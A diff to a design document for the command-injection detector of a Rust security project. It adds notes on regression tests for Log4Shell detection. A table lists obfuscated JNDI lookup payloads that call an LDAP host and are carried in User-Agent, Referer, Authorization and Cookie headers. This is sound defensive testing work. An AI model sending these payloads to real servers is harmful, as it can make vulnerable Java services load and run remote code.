@@ -163,6 +163,21 @@ Broader header scans risk overlap with `header_injection`; the allowlist is cons
 
 **Field tag stays `command_injection`** — audit log records the firing detector class, not the sub-pattern. Operators investigating high-cmdi-volume from a host can grep their audit log for `${jndi:` to identify Log4Shell specifically.
 
+### GAP-008b regression coverage (2026-05-09)
+
+QA Run-6 reported header-borne obfuscation as missed. Verification with regression tests pinned in `command_injection.rs::tests` confirms the patterns added in Run-5 GAP-008 already catch every reported shape:
+
+| Shape | Header | Test |
+|---|---|---|
+| `${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}` | User-Agent | `log4shell_ua_nested_obfuscation_blocks` |
+| `${${lower:j}ndi:ldap://x.com/a}` | User-Agent | `log4shell_ua_lower_obfuscation_blocks` |
+| `${${upper:j}ndi:ldap://x.com/a}` | User-Agent | `log4shell_ua_upper_obfuscation_blocks` |
+| Nested obfuscation in Referer | Referer | `log4shell_referer_nested_obfuscation_blocks` |
+| Bearer + obfuscation | Authorization | `log4shell_authorization_header_blocks` |
+| Cookie value | Cookie | `log4shell_cookie_header_blocks` |
+
+The Run-6 "missed" verdict was a deployment-vs-code timing discrepancy — patterns were not re-tested against the `develop` branch state. No detector-code change required; tests pin the coverage so future refactors that break it are caught immediately.
+
 ## Implementation
 
 - `crates/aegis-security/src/detectors/command_injection.rs` — pattern set, regex list, scorer (~200 lines, regex-only — no Hyperscan / Aho-Corasick dep)
